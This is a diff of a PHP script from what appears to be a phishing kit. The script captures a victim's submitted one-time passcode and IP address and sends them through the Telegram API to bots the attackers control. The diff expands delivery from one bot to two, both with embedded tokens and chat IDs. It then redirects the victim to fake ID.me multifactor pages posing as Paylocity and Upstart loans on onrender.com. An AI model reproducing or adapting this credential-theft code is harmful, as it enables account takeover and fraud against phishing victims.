@@ -3,8 +3,24 @@
 
 
 // Telegram configuration
-    define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
-    define('TELEGRAM_CHAT_ID', '1325797388');
+    // define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
+    // define('TELEGRAM_CHAT_ID', '1325797388');
+
+
+
+    $telegram_bots = [
+        [
+            'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',
+            'chat_id' => '1325797388'
+        ],
+        [
+            'token' => '7810816894:AAE7eOvKsbTjvCr3zdpgsIf-vXqddsYY0Rk',
+            'chat_id' => '7678714988'
+        ]
+        // Add more bots here if needed
+    ];
+
+
 
 
     $userotp=$_POST['userotp'];
@@ -28,27 +44,52 @@ $telegram_message = "📝 *New OTP Submission*:\n\n".
                     "💬 *IP:* $ip";
                     
 
-$telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";
+// $telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";
 
-// Send message using CURL (allows better error handling)
-$data = [
-    'chat_id' => TELEGRAM_CHAT_ID,
-    'text' => $telegram_message,
-    'parse_mode' => 'Markdown'
-];
+// // Send message using CURL (allows better error handling)
+// $data = [
+//     'chat_id' => TELEGRAM_CHAT_ID,
+//     'text' => $telegram_message,
+//     'parse_mode' => 'Markdown'
+// ];
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $telegram_url);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+// $ch = curl_init();
+// curl_setopt($ch, CURLOPT_URL, $telegram_url);
+// curl_setopt($ch, CURLOPT_POST, 1);
+// curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
-$response = curl_exec($ch);
-curl_close($ch);
+// $response = curl_exec($ch);
+// curl_close($ch);
 
 
 
-header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
+function sendMessageToTelegramBots($message, $bots) {
+    foreach ($bots as $bot) {
+        $telegram_url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
+
+        $data = [
+            'chat_id' => $bot['chat_id'],
+            'text' => $message,
+            'parse_mode' => 'Markdown'
+        ];
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $telegram_url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_exec($ch);
+        curl_close($ch);
+    }
+}
+
+// Send text message to Telegram
+sendMessageToTelegramBots($telegram_message, $telegram_bots);
+
+
+
+header("Location:hhttps://upstart-loans.onrender.com/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
 exit;
 }
 ?>
